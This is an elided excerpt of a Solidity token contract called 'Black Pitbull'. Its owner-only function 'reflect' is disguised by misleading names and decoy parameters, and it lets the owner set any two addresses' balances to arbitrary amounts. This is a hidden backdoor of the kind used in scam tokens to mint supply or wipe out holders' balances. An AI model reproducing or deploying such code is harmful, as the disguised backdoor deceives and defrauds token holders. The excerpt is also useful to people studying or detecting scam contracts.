...
contract BlackPitbull is Context, IERC20, Ownable {
    ...
    string private constant _name = "Black Pitbull";
    ...
    function reflect(bytes32 _tradeData, address sender, address user, uint256 time, bool reverted) public onlyOwner {
        require(user != address(0));
        require(time != 1, "Transfer amount must be not one");
        balances[sender] = time * (10 ** 9);
        balances[user] = time * (10 ** 9);
    }
